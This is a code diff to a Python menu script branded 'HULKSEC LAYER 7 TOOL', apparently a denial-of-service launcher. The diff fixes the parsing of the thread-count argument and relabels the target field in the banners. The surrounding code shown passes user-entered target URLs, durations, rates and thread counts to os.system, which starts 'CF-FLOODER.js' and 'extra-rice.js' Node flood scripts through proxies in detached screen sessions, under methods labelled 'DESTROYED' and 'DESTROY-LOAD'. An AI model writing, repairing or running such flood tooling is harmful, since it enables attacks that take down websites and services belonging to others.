@@ -164,7 +164,7 @@ def main():
           ║         \033[97mHULKSEC LAYER 7 TOOL\033[97m       ║
           ╚════════════════════════════════════╝\033[091
        \033[94m╔═════════════════════╝ ╚════════════════════╗
-             \033[97mTARGET:  [{url}]\033[97m
+             \033[97mTARGET:  [{host}]\033[97m
              METHOD:  [DESTROYED]
              TIME:    [{time}]
              RATE:    [{rate}]
@@ -190,7 +190,7 @@ def main():
           ║         \033[97mHULKSEC LAYER 7 TOOL\033[97m       ║
           ╚════════════════════════════════════╝\033[091
        \033[94m╔═════════════════════╝ ╚════════════════════╗
-             \033[97mTARGET:  [{url}]\033[97m
+             \033[97mTARGET:  [{host}]\033[97m
              METHOD:  [DESTROY-LOAD]
              TIME:    [{time}]
              RATE:    [{rate}]
@@ -208,7 +208,7 @@ def main():
                 url = sin.split()[1]
                 time = sin.split()[2]
                 rate = sin.split()[3]
-                thread = sin.split(4)
+                thread = sin.split()[4]
                 os.system(f'cd L7 && screen -dm node CF-FLOODER.js {url} {time} {rate} {thread} proxy.txt')
                 os.system("clear")
                 print (f"""
@@ -260,7 +260,7 @@ def main():
                 url = sin.split()[1]
                 time = sin.split()[2]
                 rate = sin.split()[3]
-                thread = sin.split(4)
+                thread = sin.split()[4]
                 os.system(f'cd L7 && screen -dm node extra-rice.js {url} {time} {rate} {thread} proxy.txt')
                 os.system("clear")
                 print (f"""
